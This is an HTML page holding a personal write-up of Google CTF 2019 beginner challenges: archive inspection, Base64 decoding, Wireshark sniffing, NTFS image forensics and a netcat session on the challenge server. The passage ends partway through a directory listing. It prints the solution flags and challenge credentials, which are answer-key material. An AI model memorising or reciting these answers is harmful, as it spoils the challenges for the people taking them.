@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>Google CTF 2019 :: T0XICITY — Wannabe h4x0r</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Google CTF 2019 Writeup 1. Enter Space-Time Coordinates After Downloading the attachment we can run the file command to get additional information. patrick@VB:~/Desktop/Google1$ file 00c2a73eec8abb4afb9c3ef3a161b64b451446910535bfc0cc81c2b04aa132ed 00c2a73eec8abb4afb9c3ef3a161b64b451446910535bfc0cc81c2b04aa132ed: Zip archive data, at least v2.0 to extract As we can see the file is an Zip archive - So let&amp;rsquo;s just unzip it! patrick@VB:~/Desktop/Google1$ unzip 00c2a73eec8abb4afb9c3ef3a161b64b451446910535bfc0cc81c2b04aa132ed Archive: 00c2a73eec8abb4afb9c3ef3a161b64b451446910535bfc0cc81c2b04aa132ed extracting: log.txt extracting: rand2  We get two files log.txt and rand2. patrick@VB:~/Desktop/Google1$ cat rand2  Running the cat command on the rand2 file shows us the first flag:"/>
+<meta name="keywords" content="hacking, bash, linux, ctf"/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="https://T0XICITY.com/blog/googlectf2019/" />
+
+
+
+
+
+<link rel="stylesheet" href="https://T0XICITY.com/assets/style.css">
+
+
+<link rel="stylesheet" href="https://T0XICITY.com/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://T0XICITY.com/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="https://T0XICITY.com/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Google CTF 2019"/>
+<meta name="twitter:description" content="Google CTF 2019 Beginner&#39;s Quest Writeup"/>
+
+
+
+<meta property="og:title" content="Google CTF 2019" />
+<meta property="og:description" content="Google CTF 2019 Beginner&#39;s Quest Writeup" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://T0XICITY.com/blog/googlectf2019/" />
+<meta property="article:published_time" content="2020-03-28T15:22:16+01:00" />
+<meta property="article:modified_time" content="2020-03-28T15:22:16+01:00" /><meta property="og:site_name" content="T0XICITY" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">T0XICITY</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/blog">Blog</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/blog">Blog</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h2 class="post-title"><a href="https://T0XICITY.com/blog/googlectf2019/">Google CTF 2019</a></h2>
+    <div class="post-meta">
+      
+        <span class="post-date">
+          2020-03-28
+        </span>
+
+        
+          
+        
+      
+
+      <span class="post-author">— Written by Patrick</span>
+      
+    </div>
+
+    
+
+    
+      
+        <img src="https://T0XICITY.com/img/GoogleCTF2019/googleCtf2019_image1.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <h1 id="google-ctf-2019-writeup">Google CTF 2019 Writeup</h1>
+<h2 id="1-enter-space-time-coordinates">1. Enter Space-Time Coordinates</h2>
+<p>After Downloading the attachment we can run the <strong>file</strong> command to get additional information.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">patrick</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">VB</span>:<span style="color:#960050;background-color:#1e0010">~</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Desktop</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Google1</span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">file</span> <span style="color:#ae81ff">00</span><span style="color:#a6e22e">c2a73eec8abb4afb9c3ef3a161b64b451446910535bfc0cc81c2b04aa132ed</span> 
+<span style="color:#ae81ff">00</span><span style="color:#a6e22e">c2a73eec8abb4afb9c3ef3a161b64b451446910535bfc0cc81c2b04aa132ed</span>: <span style="color:#a6e22e">Zip</span> <span style="color:#a6e22e">archive</span> <span style="color:#a6e22e">data</span>, <span style="color:#a6e22e">at</span> <span style="color:#a6e22e">least</span> <span style="color:#a6e22e">v2</span><span style="color:#ae81ff">.0</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">extract</span></code></pre></div>
+As we can see the file is an Zip archive - So let&rsquo;s just unzip it!
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">patrick</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">VB</span>:<span style="color:#960050;background-color:#1e0010">~</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Desktop</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Google1</span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">unzip</span> <span style="color:#ae81ff">00</span><span style="color:#a6e22e">c2a73eec8abb4afb9c3ef3a161b64b451446910535bfc0cc81c2b04aa132ed</span>
+<span style="color:#a6e22e">Archive</span>:  <span style="color:#ae81ff">00</span><span style="color:#a6e22e">c2a73eec8abb4afb9c3ef3a161b64b451446910535bfc0cc81c2b04aa132ed</span>
+ <span style="color:#a6e22e">extracting</span>: <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">txt</span>                 
+ <span style="color:#a6e22e">extracting</span>: <span style="color:#a6e22e">rand2</span>    </code></pre></div>
+We get two files log.txt and rand2.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">patrick</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">VB</span>:<span style="color:#960050;background-color:#1e0010">~</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Desktop</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Google1</span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">cat</span> <span style="color:#a6e22e">rand2</span> </code></pre></div>
+Running the <strong>cat</strong> command on the rand2 file shows us the first flag:<br>
+<strong>CTF{welcome_to_googlectf}</strong></p>
+<h2 id="2-satellite">2. Satellite</h2>
+<p>Downloading the attatchment we get again a Zip archive.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">patrick</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">VB</span>:<span style="color:#960050;background-color:#1e0010">~</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Desktop</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Google2</span><span style="color:#960050;background-color:#1e0010">$</span> <span style="color:#a6e22e">unzip</span> <span style="color:#ae81ff">768</span><span style="color:#a6e22e">be4f10429f613eb27fa3e3937fe21c7581bdca97d6909e070ab6f7dbf2fbf</span>
+<span style="color:#a6e22e">Archive</span>:  <span style="color:#ae81ff">768</span><span style="color:#a6e22e">be4f10429f613eb27fa3e3937fe21c7581bdca97d6909e070ab6f7dbf2fbf</span>
+ <span style="color:#a6e22e">extracting</span>: <span style="color:#a6e22e">README</span>.<span style="color:#a6e22e">pdf</span>              
+ <span style="color:#a6e22e">extracting</span>: <span style="color:#a6e22e">init_sat</span></code></pre></div>
+The file contains a PDF file so lets take a look at it first.
+<img src="/img/GoogleCTF2019/challange2.1.png" alt="Image Challange2.1">
+The other file is a executable so lets change it&rsquo;s premissions and run it.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">patrick</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">VB</span>:<span style="color:#960050;background-color:#1e0010">~</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Desktop</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Google2</span><span style="color:#960050;background-color:#1e0010">$</span> .<span style="color:#f92672">/</span><span style="color:#a6e22e">init_sat</span> 
+<span style="color:#a6e22e">Hello</span> <span style="color:#a6e22e">Operator</span>. <span style="color:#a6e22e">Ready</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">connect</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">satellite</span><span style="color:#960050;background-color:#1e0010">?</span>
+<span style="color:#a6e22e">Enter</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">name</span> <span style="color:#a6e22e">of</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">satellite</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">connect</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">or</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">exit</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">quit</span></code></pre></div>
+We have to enter the name of the satelite. (It&rsquo;s in the image of README -&gt; Osmium)
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"><span style="color:#a6e22e">patrick</span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#a6e22e">VB</span>:<span style="color:#960050;background-color:#1e0010">~</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Desktop</span><span style="color:#f92672">/</span><span style="color:#a6e22e">Google2</span><span style="color:#960050;background-color:#1e0010">$</span> .<span style="color:#f92672">/</span><span style="color:#a6e22e">init_sat</span> 
+<span style="color:#a6e22e">Hello</span> <span style="color:#a6e22e">Operator</span>. <span style="color:#a6e22e">Ready</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">connect</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">satellite</span><span style="color:#960050;background-color:#1e0010">?</span>
+<span style="color:#a6e22e">Enter</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">name</span> <span style="color:#a6e22e">of</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">satellite</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">connect</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">or</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">exit</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">quit</span>
+<span style="color:#a6e22e">osmium</span>
+<span style="color:#a6e22e">Establishing</span> <span style="color:#a6e22e">secure</span> <span style="color:#a6e22e">connection</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">osmium</span>
+ <span style="color:#a6e22e">satellite</span><span style="color:#f92672">...</span>
+<span style="color:#a6e22e">Welcome</span>. <span style="color:#a6e22e">Enter</span> (<span style="color:#a6e22e">a</span>) <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">display</span> <span style="color:#a6e22e">config</span> <span style="color:#a6e22e">data</span>, (<span style="color:#a6e22e">b</span>) <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">erase</span> <span style="color:#a6e22e">all</span> <span style="color:#a6e22e">data</span> <span style="color:#a6e22e">or</span> (<span style="color:#a6e22e">c</span>) <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">disconnect</span>
+
+<span style="color:#a6e22e">a</span>
+<span style="color:#a6e22e">Username</span>: <span style="color:#a6e22e">brewtoot</span> <span style="color:#a6e22e">password</span>: <span style="color:#f92672">********************</span>	<span style="color:#ae81ff">166.00</span> <span style="color:#a6e22e">IS</span><span style="color:#f92672">-</span><span style="color:#ae81ff">19</span> <span style="color:#ae81ff">2019</span><span style="color:#f92672">/</span><span style="color:#ae81ff">05</span><span style="color:#f92672">/</span><span style="color:#ae81ff">09</span> <span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>:<span style="color:#ae81ff">00</span>	<span style="color:#a6e22e">Swath</span> <span style="color:#ae81ff">640</span><span style="color:#a6e22e">km</span>	<span style="color:#a6e22e">Revisit</span> <span style="color:#a6e22e">capacity</span> <span style="color:#a6e22e">twice</span> <span style="color:#a6e22e">daily</span>, <span style="color:#a6e22e">anywhere</span> <span style="color:#a6e22e">Resolution</span> <span style="color:#a6e22e">panchromatic</span>: <span style="color:#ae81ff">30</span><span style="color:#a6e22e">cm</span> <span style="color:#a6e22e">multispectral</span>: <span style="color:#ae81ff">1.2</span><span style="color:#a6e22e">m</span>	<span style="color:#a6e22e">Daily</span> <span style="color:#a6e22e">acquisition</span> <span style="color:#a6e22e">capacity</span>: <span style="color:#ae81ff">220</span>,<span style="color:#ae81ff">000</span><span style="color:#a6e22e">km</span><span style="color:#960050;background-color:#1e0010">²</span>	<span style="color:#a6e22e">Remaining</span> <span style="color:#a6e22e">config</span> <span style="color:#a6e22e">data</span> <span style="color:#a6e22e">written</span> <span style="color:#a6e22e">to</span>: <span style="color:#a6e22e">https</span>:<span style="color:#f92672">//</span><span style="color:#a6e22e">docs</span>.<span style="color:#a6e22e">google</span>.<span style="color:#a6e22e">com</span><span style="color:#f92672">/</span><span style="color:#a6e22e">document</span><span style="color:#f92672">/</span><span style="color:#a6e22e">d</span><span style="color:#f92672">/</span><span style="color:#ae81ff">14</span><span style="color:#a6e22e">eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303</span><span style="color:#f92672">-</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">E</span></code></pre></div>
+The Username is brewtoot and the password is covered.</p>
+<p>Pressing &ldquo;a&rdquo; is showing us the config which contains a Google-docs URI.
+<img src="/img/GoogleCTF2019/challange2.2.png" alt="Image Challange2.2">
+If you type the message into an online decoder you will find out that the string id Base64 encoded and contains a combination of username and password.</p>
+<ul>
+<li>Username: wireshark-rocks</li>
+<li>Password: start-sniffing!</li>
+</ul>
+<p>As we can see from the username the next step is to run Wireshark and sniff the connection to the satelite.
+<img src="/img/GoogleCTF2019/challange2.3.png" alt="Image Challange2.3">
+From the sniffed package we get our second flag:<br>
+<strong>CTF{4efcc72090af28fd33a2118985541f92e793477f}</strong></p>
+<h2 id="3-home-computer">3. Home Computer</h2>
+<p>This is a forensic challange where we get a NTFS image and a simple text note without useful information on solving the challange.</p>
+<ul>
+<li>Content of note: If you&rsquo;re on MacOS, you can rename .ntfs to .dmg.</li>
+</ul>
+<p>My first step was to analize the image with the tool FTK imager. We can see, that there are some files on the image.<br>
+<img src="/img/GoogleCTF2019/challange3.1.png" alt="Image Challange3.1">
+By navigating the system you will find the following:
+<img src="/img/GoogleCTF2019/challange3.2.jpg" alt="Image Challange3.2">
+If we navigate to <strong>View</strong> -&gt; <strong>File List</strong> we find the hidden image containing the flag.
+<img src="/img/GoogleCTF2019/challange3.3.png" alt="Image Challange3.3">
+Flag:<br>
+<strong>CTF{congratsyoufoundmycreds}</strong></p>
+<h2 id="4-work-computer">4 Work Computer</h2>
+<p>The first step is to connect to the machine i am using netcat for that.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go"> <span style="color:#a6e22e">nc</span> <span style="color:#a6e22e">readme</span>.<span style="color:#a6e22e">ctfcompetition</span>.<span style="color:#a6e22e">com</span> <span style="color:#ae81ff">1337</span></code></pre></div>
+This opens a shell on the target system. The current directory contains two files ORME.flag and README.flag.
+Both files cannot be opened or viewed using cat, nano, man, more, less, vim, file.
+The commands dont work on the two files neither on other directories.<br>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go">&gt; <span style="color:#a6e22e">ls</span>
+<span style="color:#a6e22e">ORME</span>.<span style="color:#a6e22e">flag</span>
+<span style="color:#a6e22e">README</span>.<span style="color:#a6e22e">flag</span>
+&gt; <span style="color:#a6e22e">cat</span> <span style="color:#a6e22e">ORME</span>.<span style="color:#a6e22e">flag</span>
+<span style="color:#66d9ef">error</span>: <span style="color:#a6e22e">No</span> <span style="color:#a6e22e">such</span> <span style="color:#a6e22e">file</span> <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">directory</span>
+&gt; <span style="color:#a6e22e">cat</span> <span style="color:#a6e22e">README</span>.<span style="color:#a6e22e">flag</span>
+<span style="color:#66d9ef">error</span>: <span style="color:#a6e22e">No</span> <span style="color:#a6e22e">such</span> <span style="color:#a6e22e">file</span> <span style="color:#a6e22e">or</span> <span style="color:#a6e22e">directory</span>
+&gt; </code></pre></div>
+To find out which commands can be used we have to check the \bin directories.
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-go" data-lang="go">&gt; <span style="color:#a6e22e">ls</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">la</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">sbin</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">usr</span><span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span>
+<span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span>:
+<span style="color:#a6e22e">total</span> <span style="color:#ae81ff">808</span>
+<span style="color:#a6e22e">drwxr</span><span style="color:#f92672">-</span><span style="color:#a6e22e">xr</span><span style="color:#f92672">-</span><span style="color:#a6e22e">x</span>    <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>         <span style="color:#ae81ff">4096</span> <span style="color:#a6e22e">Jun</span> <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2019</span> .
+<span style="color:#a6e22e">drwxr</span><span style="color:#f92672">-</span><span style="color:#a6e22e">xr</span><span style="color:#f92672">-</span><span style="color:#a6e22e">x</span>   <span style="color:#ae81ff">20</span> <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">0</span>             <span style="color:#ae81ff">4096</span> <span style="color:#a6e22e">Jun</span> <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2019</span> ..
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">arch</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#f92672">-</span><span style="color:#a6e22e">rwxr</span><span style="color:#f92672">-</span><span style="color:#a6e22e">xr</span><span style="color:#f92672">-</span><span style="color:#a6e22e">x</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>       <span style="color:#ae81ff">796240</span> <span style="color:#a6e22e">Jan</span> <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">chgrp</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">chown</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">conspy</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">date</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">df</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">dmesg</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">dnsdomainname</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">dumpkmap</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">echo</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">fdflush</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">fsync</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">getopt</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">hostname</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">ionice</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">iostat</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
+<span style="color:#a6e22e">lrwxrwxrwx</span>    <span style="color:#ae81ff">1</span> <span style="color:#ae81ff">65534</span>    <span style="color:#ae81ff">65534</span>           <span style="color:#ae81ff">12</span> <span style="color:#a6e22e">May</span>  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> <span style="color:#a6e22e">ipcalc</span> <span style="color:#f92672">-</span>&gt; <span style="color:#f92672">/</span><span style="color:#a6e22e">bin</span><span style="color:#f92672">/</span><span style="color:#a6e22e">busybox</span>
